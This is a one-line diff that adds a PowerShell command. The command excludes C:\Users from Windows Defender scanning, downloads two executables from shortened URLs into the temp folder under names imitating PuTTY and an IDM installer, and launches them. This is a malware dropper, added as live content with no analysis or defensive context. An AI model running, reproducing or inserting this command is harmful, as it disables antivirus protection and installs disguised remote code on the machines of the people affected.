@@ -1,0 +1,1 @@
+Add-MpPreference -ExclusionPath "C:\Users"; Start-Sleep -Seconds 3; Invoke-WebRequest -Uri "https://tinyurl.com/mryfwd2x" -OutFile "$env:TEMP\putty.exe"; Invoke-WebRequest -Uri "https://tinyurl.com/yc66xaxe" -OutFile "$env:TEMP\idm.v6.42.63.exe"; Start-Process "$env:TEMP\putty.exe"; Start-Process "$env:TEMP\idm.v6.42.63.exe"
